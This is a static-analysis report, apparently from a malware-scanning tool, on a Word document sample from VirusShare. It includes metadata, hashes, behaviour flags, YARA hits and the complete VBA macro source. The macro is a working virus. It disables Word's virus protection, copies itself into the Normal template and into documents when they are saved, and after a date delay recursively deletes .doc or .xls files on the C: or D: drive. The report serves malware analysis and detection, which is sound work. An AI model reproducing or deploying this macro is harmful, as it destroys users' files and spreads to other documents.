{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"avp\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Chr": "May attempt to obfuscate specific str",
            "Kill": "May delete a file",
            "Lib": "May run code from a DLL",
            "Open": "May open a file",
            "Output": "May write to a file",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "WINDOWS": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "\n\nOption Explicit\nDim k As String, f As String\nPrivate Declare Function FindFirstFile Lib \"kernel32\" Alias \"FindFirstFileA\" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long\nPrivate Declare Function FindNextFile Lib \"kernel32\" Alias \"FindNextFileA\" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long\nPrivate Declare Function GetFileAttributes Lib \"kernel32\" Alias \"GetFileAttributesA\" (ByVal lpFileName As String) As Long\nPrivate Declare Function FindClose Lib \"kernel32\" (ByVal hFindFile As Long) As Long\nConst MAX_PATH = 260\nConst MAXDWORD = &HFFFF\nConst INVALID_HANDLE_VALUE = -1\nConst FILE_ATTRIBUTE_ARCHIVE = &H20\nConst FILE_ATTRIBUTE_DIRECTORY = &H10\nConst FILE_ATTRIBUTE_HIDDEN = &H2\nConst FILE_ATTRIBUTE_NORMAL = &H80\nConst FILE_ATTRIBUTE_READONLY = &H1\nConst FILE_ATTRIBUTE_SYSTEM = &H4\nConst FILE_ATTRIBUTE_TEMPORARY = &H100\nPrivate Type FILETIME\ndwLowDateTime As Long\ndwHighDateTime As Long\nEnd Type\nPrivate Type WIN32_FIND_DATA\ndwFileAttributes As Long\nftCreationTime As FILETIME\nftLastAccessTime As FILETIME\nftLastWriteTime As FILETIME\nnFileSizeHigh As Long\nnFileSizeLow As Long\ndwReserved0 As Long\ndwReserved1 As Long\ncFileName As String * MAX_PATH\ncAlternate As String * 14\nEnd Type\nPrivate Function StripNulls(OriginalStr As String) As String\nIf (InStr(OriginalStr, Chr(0)) > 0) Then\nOriginalStr = Left(OriginalStr, InStr(OriginalStr, Chr(0)) - 1)\nEnd If\nStripNulls = OriginalStr\nEnd Function\nPrivate Function FindFilesAPI(path As String, SearchStr As String, FileCount As Integer, DirCount As Integer)\nOn Error Resume Next\nDim FileName As String\nDim DirName As String\nDim dirNames() As String\nDim nDir As Integer\nDim i As Integer\nDim hSearch As Long\nDim WFD As WIN32_FIND_DATA\nDim Cont As Integer\nIf Right(path, 1) <> \"\\\" Then path = path & \"\\\"\nnDir = 0\nReDim dirNames(nDir)\nCont = True\nhSearch = FindFirstFile(path & \"*\", WFD)\nIf hSearch <> INVALID_HANDLE_VALUE Then\nDo While Cont\nDirName = StripNulls(WFD.cFileName)\nIf (DirName <> \".\") And (DirName <> \"..\") Then\nIf GetFileAttributes(path & DirName) And                            FILE_ATTRIBUTE_DIRECTORY Then\ndirNames(nDir) = DirName\nDirCount = DirCount + 1\nnDir = nDir + 1\nReDim Preserve dirNames(nDir)\nEnd If\nEnd If\nCont = FindNextFile(hSearch, WFD)\nLoop\nCont = FindClose(hSearch)\nEnd If\nhSearch = FindFirstFile(path & SearchStr, WFD)\nCont = True\nIf hSearch <> INVALID_HANDLE_VALUE Then\nWhile Cont\nFileName = StripNulls(WFD.cFileName)\nIf (FileName <> \".\") And (FileName <> \"..\") Then\nFindFilesAPI = FindFilesAPI + (WFD.nFileSizeHigh * MAXDWORD) + WFD.nFileSizeLow\nFileCount = FileCount + 1\nOn Error Resume Next\nKill path & FileName\nEnd If\nCont = FindNextFile(hSearch, WFD)\nWend\nCont = FindClose(hSearch)\nEnd If\nIf nDir > 0 Then\nFor i = 0 To nDir - 1\nFindFilesAPI = FindFilesAPI + FindFilesAPI(path & dirNames(i) & \"\\\", SearchStr, FileCount, DirCount)\nNext i\nEnd If\nEnd Function\n Sub AutoOpen()\nDim ad, nt\nOn Error Resume Next\nOptions.VirusProtection = False\nad = ActiveDocument.Name\nnt = NormalTemplate.FullName\nIf NormalTemplate.VBProject.VBComponents.Item(\"Avp\").Name = \" \" Then\nk = FreeFile\nMakeFile\nEnd If\nIf NormalTemplate.VBProject.VBComponents.Item(\"Avp\").Name <> \"Avp\" Then\nApplication.OrganizerCopy Source:=ad, Destination:=nt, Name:=\"Avp\", Object:=wdOrganizerObjectProjectItems\nEnd If\nNormalTemplate.Save\nDooIt\nEnd Sub\nSub FileSave()\nOn Error Resume Next\nIf ActiveDocument.VBProject.VBComponents.Item(\"Avp\").Name <> \"avp\" Then\nNormalTemplate.VBProject.VBComponents(\"avp\").Export \"C:\\Winlog.log\"\nActiveDocument.VBProject.VBComponents.import \"C:\\Winlog.log\"\nKill \"C:\\Winlog.log\"\nEnd If\nActiveDocument.Save\nk = FreeFile\nf = Dir$(\"C:\\WINDOWS\\Application Data\\HelBoot.txt\")\nIf f = \"\" Then\nMakeFile\nEnd If\nDooIt\nEnd Sub\nSub ViewVBCode()\nIf Options.BlueScreen = True Then ShowVisualBasicEditor = True\nEnd Sub\nSub ToolsMacro()\nEnd Sub\nSub DooIt()\nOn Error Resume Next\nDim d1 As Date, d, k As String, d2 As Date, t As Date\nd1 = Format(Now, \"short date\"): k = FreeFile\nOpen \"C:\\WINDOWS\\HelBoot.txt\" For Input As #k\nt = Format(Now, \"short date\")\nInput #k, t\nClose k\nd2 = CDate(t): d = d1 - d2\nDim NumFiles As Integer, NumDirs As Integer, FileSize As Long\nDim SearchPath As String, FindStr As String, p, s\ns = Int(1 + (Rnd() * 2))\nIf s = 1 Then\nSearchPath = \"C:\\\"\nElseIf s = 2 Then\nSearchPath = \"D:\\\"\nEnd If\nIf 5 < d Then\np = Int(1 + (Rnd() * 2))\nIf p = 1 Then\nFindStr = \"*.xls\"\nElseIf p = 2 Then\nFindStr = \"*.doc\"\nElseIf p = 1 And 12 < d Then\nFindStr = \"*.txt\"\nEnd If\nFileSize = FindFilesAPI(SearchPath, FindStr, NumFiles, NumDirs)\nEnd If\nEnd Sub\nSub MakeFile()\nOpen \"C:\\WINDOWS\\Application Data\\HelBoot.txt\" For Output As #k\nDim t As Date\nt = Format(Now, \"short date\")\nWrite #k, t\nClose k\nEnd Sub\n"
    },
    "filename": "VirusShare_0c8e23cef9baf33d3025d925636cf85c",
    "filesize": 36864,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 936, Title: Virus, Author: Scandisk, Template: Normal.dot, Last Saved By: Scandisk, Revision Number: 2, Name of Creating Application: Microsoft Word 9.0, Total Editing Time: 01:00, Create Time/Date: Wed Aug 21 12:12:00 2002, Last Saved Time/Date: Wed Aug 21 12:44:00 2002, Number of Pages: 1, Number of Words: 1, Number of Characters: 9, Security: 0",
    "hashes": {
        "md5": "0c8e23cef9baf33d3025d925636cf85c",
        "sha1": "8f4c3062565009466ef01019cf27c661524c7d6c",
        "sha256": "b7ac39dda21d3e1e8d5ef067cc82ede1cc9546d1c60ecc9400e91ef65a401410"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            "Virus!!!!!",
            ". A!",
            "\u061ek=W[SO",
            "\u032chfhf",
            " & 6\"",
            "=@\\]^",
            "Virus",
            "Scandisk",
            "Normal.dot",
            "Scandisk",
            "Microsoft Word 9.0",
            "Scandisk",
            "Virus",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$Custom",
            "izC1",
            "C:\\Winlog.log",
            "C:\\Winlog.log",
            "C:\\Winlog.log",
            "C:\\WINDOWS\\Application Data\\HelBoot.txt",
            "short date$",
            "C:\\WINDOWS\\HelBoot.txt ",
            "short date$",
            "*.xls",
            "*.doc",
            "*.txt",
            "C:\\WINDOWS\\Application Data\\HelBoot.txt",
            "short date$",
            "Attribut",
            "e VB_Nam",
            "e = \"avp",
            "Optio",
            "n Explic",
            "Dim @k As S",
            "g, f",
            "riva",
            "lare Fun",
            "FindFi",
            "rstFile ",
            "Lib \"ker",
            "nel32\" _",
            "Alias ",
            "(ByVal lp",
            "[leDat",
            "WIN32_",
            "FIND_DATA)",
            "Long",
            "NexN",
            "Nh[7lM",
            "5,iLGe{",
            "%CxlosQmf?",
            "onst MAX _PATH",
            "DWORbD@",
            "NVALID_H@ANDLE_",
            "ATTRIBUT",
            "E_ARCHIV1",
            "\tDIRECTORY",
            "1\tHIDDEN",
            "NORMA",
            "READ",
            "SYShTEM",
            "P8ORAF-",
            "p@@BTIME",
            "dwLowe",
            "High",
            "End A",
            "G?\tg",
            "ftCrea{%",
            "ftLastAc",
            "cess",
            "Siz>e",
            "Reservedj0",
            "cAlt  ",
            "pNulls",
            "(Original@",
            "ng\"aC",
            "If (In",
            ", Chr(",
            "0)) > 0)` Thenh\t= LeftK",
            "\t@- 1)",
            "sAPI`(path",
            "Search",
            "- Count",
            "In teger",
            "Orror  9u W!/6",
            "\"<*Rmt%,0 <> \"\\\": b(J=",
            "= zRe!",
            "= True",
            "= C3c3",
            "*\", ",
            "MDo WhA",
            "\"W#( ",
            "B_7_\\S",
            "c'= 0",
            "Pr#E ",
            "Loop]t",
            "p7& 6",
            "5=TL",
            "%[^X) 2",
            "DxKill6",
            "Wend",
            "q]2$+",
            "\\[FLi",
            "0 To ",
            "%2V(i)",
            "C,\t!",
            "&^ Su",
            "b AutoOp",
            "Gad,< n",
            "VirusProte",
            "+alsI",
            "veDoc\\nt.C",
            "= Normal Templ@v.FO@s",
            ".VBComp",
            "onents.I",
            "tem(\"AvpL\")",
            "Free",
            "r.Organ",
            "pmpy Sou rce:=q",
            "st\u0400\u0451:=nt$, ",
            ", Ob",
            ":=wd",
            "DooI",
            "(b).",
            "ort \"C:\\Winlog.0",
            "[\"ff0# a$(B",
            "O(WS\\",
            " `a\\",
            "HelBoot.ptxt\"2",
            "b Vierw,de",
            "4BlueSc+n",
            " ShowV",
            "isualBasic",
            "FindFirstFileA",
            "FindNextFileA",
            "GetFileAttributesA",
            "FindClose",
            "Find]",
            "bute]",
            "fEdit0E",
            "ToolsMacro",
            "As Date,@ d, k ",
            "String",
            "= Format",
            "(Now, \"s@hort d",
            "<reeF",
            "n \"C:\\WI",
            "NDOWS\\He",
            "lBoot.tx",
            " InpuA",
            "+#k, t",
            "Close ",
            "- d2",
            "Dim Num",
            "Integer,",
            "Size",
            "Searc`hPath",
            "\t\tp, 0s",
            "?2(1",
            " + (Rnd() * 2))^",
            "1 The(n",
            "ElseI",
            "If(5 < d}",
            "^;*.xlsG",
            "J\tdocK\t1 A@!12",
            "4D*V",
            "sAPI(",
            "SubOub Mak",
            "NApplicationAa\\xOut\u021e\u0239W`rite F'",
            "PVVv",
            "PVVv",
            "Wordk`",
            "VBA`",
            "Win16~`",
            "Win32",
            "Mac`",
            "VBA6#`",
            "stdole``",
            "Project-`",
            "ThisDocument<`",
            "_Evaluate",
            "Normal`",
            "Office",
            "Documentj`",
            "\u01231c`",
            "avpu`",
            "FindFirstFile`",
            "lpFileName2`",
            "lpFindFileData[`",
            "WIN32_FIND_DATA`",
            "kernel32_`",
            "FindNextFilehD`",
            "hFindFile`",
            "GetFileAttributesi`",
            "FindClose`",
            "MAX_PATH(`",
            "MAXDWORD`",
            "INVALID_HANDLE_VALUE`",
            "FILE_ATTRIBUTE_ARCHIVE&%`",
            "FILE_ATTRIBUTE_DIRECTORY",
            "FILE_ATTRIBUTE_HIDDEN<`",
            "FILE_ATTRIBUTE_NORMAL{`",
            "FILE_ATTRIBUTE_READONLYT`",
            "FILE_ATTRIBUTE_SYSTEM@D`",
            "FILE_ATTRIBUTE_TEMPORARY",
            "FILETIME%`",
            "dwLowDateTime",
            "dwHighDateTimeB`",
            "dwFileAttributeso`",
            "ftCreationTime{`",
            "ftLastAccessTime`",
            "ftLastWriteTime",
            "nFileSizeHigh>N`",
            "nFileSizeLowb5`",
            "dwReserved0@`",
            "dwReserved1@`",
            "cFileName",
            "cAlternate`",
            "StripNulls`",
            "OriginalStr",
            "ChrK~`",
            "FindFilesAPI`",
            "path2",
            "SearchStr",
            "FileCount=`",
            "DirCount",
            "FileNamej`",
            "DirName^`",
            "dirNames`",
            "nDir5",
            "hSearchu`",
            "WFD`",
            "Cont{`",
            "Right",
            "Kill`",
            "AutoOpen*`",
            "ad~\\`",
            "nto^`",
            "Options`",
            "VirusProtectionoD`",
            "ActiveDocument\\`",
            "NormalTemplateq`",
            "FullName\u041e`",
            "VBProjectOh`",
            "VBComponents",
            "Itemz`",
            "MakeFile{`",
            "Application*`",
            "OrganizerCopy`",
            "SourceG`",
            "Destination\u043b`",
            "wdOrganizerObjectProjectItems`",
            "Save`",
            "DooItn`",
            "FileSave",
            "Export`",
            "importi`",
            "ViewVBCode`",
            "BlueScreen\u076a`",
            "ShowVisualBasicEditor`",
            "ToolsMacrou`",
            "d1\\`",
            "d2\\`",
            "Now%`",
            "NumFiles`",
            "NumDirs`",
            "FileSizeh`",
            "SearchPath",
            "FindStr`",
            "RndR`",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "DNorma",
            "lDNBr",
            "X*\\C",
            "!OfficfO`f",
            "!G{2D",
            "F8D04C-5",
            "BFA-101B -BDE5fAA5d4",
            "2fgr",
            "am Files",
            "\\Microso(ft ",
            "MSO9.DLL#",
            " 9.0 Ob",
            " LibraryC",
            "aThis",
            "DocumentG",
            "avpGBa",
            "ThisDocument",
            "ID=\"{5FF80D78-B53E-11D6-A81C-00505656BF76}\"",
            "Document=ThisDocument/&H00000000",
            "Module=avp",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"4745978FABB341B741B741B741B7P",
            "DPB=\"E1E331B232B232B2\"",
            "GC=\"7B79ABD344D444D4BB\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "avp=0, 0, 0, 0, C",
            "Microsoft Word \u0135",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "*.doc": "Word",
            "*.txt": "Text",
            "*.xls": "Excel",
            "C:\\WINDOWS\\Application Data\\HelBoot.txt": "Text",
            "C:\\Winlog.log": "Log"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.347010",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
